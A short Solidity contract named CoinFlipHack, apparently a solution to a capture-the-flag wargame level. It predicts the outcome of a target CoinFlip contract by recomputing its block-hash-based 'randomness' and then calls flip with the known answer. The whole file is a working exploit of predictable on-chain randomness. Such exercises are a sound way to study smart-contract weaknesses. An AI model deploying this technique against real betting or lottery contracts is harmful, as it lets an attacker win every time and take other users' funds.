// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract CoinFlipHack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlip;

    constructor(address addr) public {
        coinFlip = CoinFlip(addr);
    }

    function get_flip() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flipCoin = blockValue / FACTOR;
        bool side = flipCoin == 1 ? true : false;

        return side;
    }

    function hack() public {    
        bool guess = get_flip();            
        coinFlip.flip(guess);
    }
}
